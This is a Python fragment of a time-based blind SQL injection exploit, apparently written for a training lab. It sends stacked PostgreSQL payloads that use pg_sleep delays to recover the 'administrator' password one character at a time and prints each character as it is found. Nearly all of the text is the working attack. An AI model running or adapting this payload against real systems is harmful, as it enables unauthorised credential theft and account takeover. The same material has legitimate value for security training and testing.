...
def blind_sql_exploit(ascii_group):
    ...
    for i in range(1,21): # from 1 to 20
        for char in search_group(ascii_group):
            ...
            payload ="a'%3b+SELECT+CASE+WHEN+((select count(username) from users where username = 'administrator' and substring(password,{},1)='{}')=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--".format(i,char)
            headers = {
            ...
            if (r.elapsed.total_seconds() > 8):
                print("time is your life's greatest power - "+ str(r.elapsed.total_seconds()))
                admin_pass+=char
                print("[*] "+admin_pass)
                break
